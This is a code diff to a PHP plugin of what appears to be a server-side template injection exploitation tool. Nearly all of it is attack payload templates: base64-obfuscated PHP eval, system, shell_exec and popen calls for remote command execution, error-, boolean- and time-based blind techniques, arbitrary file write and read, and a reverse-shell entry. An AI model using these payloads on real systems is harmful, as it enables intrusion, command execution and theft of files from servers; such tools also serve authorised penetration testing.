@@ -25,18 +25,26 @@ class Php(Plugin):
                 'test_render': f'print({rand.randints[0]}+{rand.randints[1]});',
                 'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
             },
-            'write': {
-                'call': 'evaluate',
-                'write': """$d="{chunk_b64}"; file_put_contents("{path}", base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)),FILE_APPEND);""",
-                'truncate': """file_put_contents("{path}", "");"""
+            'render_error': {
+                'call': 'inject',
+                'render': """{code}""",
+                # "abc"() tries to call function abc
+                'header': """fopen(join("",["Y:/A:/",strval({header[0]}+{header[1]}),rtrim(strval(""",
+                'trailer': """)),strval({trailer[0]}+{trailer[1]})]),"r");""",
+                'test_render': f'{rand.randints[0]}+{rand.randints[1]}',
+                'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
             },
-            'read': {
-                'call': 'evaluate',
-                'read': """print(base64_encode(file_get_contents("{path}")));"""
+            'boolean': {
+                'call': 'evaluate_blind',
+                'test_bool_true':  "'2' + '3' == 5",
+                'test_bool_false': "'2' + '5' == 3",
+                'verify_bool_true':  "strlen('2') == 1",
+                'verify_bool_false': "strlen('1') == 2"
             },
-            'md5': {
-                'call': 'evaluate',
-                'md5': """is_file("{path}") && print(md5_file("{path}"));"""
+            'blind': {
+                'call': 'evaluate_blind',
+                'test_bool_true': """True""",
+                'test_bool_false': """False"""
             },
             'evaluate': {
                 'call': 'render',
@@ -44,20 +52,33 @@ class Php(Plugin):
                 'test_os': 'echo PHP_OS;',
                 'test_os_expected': r'^[\w-]+$'
             },
-            'execute': {
-                'call': 'evaluate',
-                'execute': """$d="{code_b64}";system(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)));""",
-                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
-                'test_cmd_expected': rand.randstrings[2] 
+            'evaluate_error': {
+                # Dirty hack from Twig
+                'call': 'execute',
+                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
             },
-            'blind': {
-                'call': 'evaluate_blind',
-                'test_bool_true': """True""",
-                'test_bool_false': """False"""
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)) . ");"));"""
             },
             'evaluate_blind': {
                 'call': 'inject',
                 'evaluate_blind': """$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)) . ") && sleep({delay});");"""
+            },
+            'execute': {
+                'call': 'evaluate',
+                'execute': """$d="{code_b64}";system(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)));""",
+                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
+                'test_cmd_expected': rand.randstrings[2]
+            },
+            'execute_error': {
+                'call': 'render',
+                # Using shell_exec to get full output
+                'execute': """shell_exec(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))"""
+            },
+            'execute_boolean': {
+                'call': 'inject',
+                'execute_blind': """$d="{code_b64}";1 / (pclose(popen(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)), "wb")) == 0);"""
             },
             'execute_blind': {
                 'call': 'inject',
@@ -70,6 +91,19 @@ class Php(Plugin):
             'reverse_shell': {
                 'call': 'execute_blind',
                 'reverse_shell': bash.reverse_shell
+            },
+            'write': {
+                'call': 'evaluate',
+                'write': """$d="{chunk_b64}"; file_put_contents("{path}", base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)),FILE_APPEND);""",
+                'truncate': """file_put_contents("{path}", "");"""
+            },
+            'read': {
+                'call': 'evaluate',
+                'read': """print(base64_encode(file_get_contents("{path}")));"""
+            },
+            'md5': {
+                'call': 'evaluate',
+                'md5': """is_file("{path}") && print(md5_file("{path}"));"""
             },
         })
 
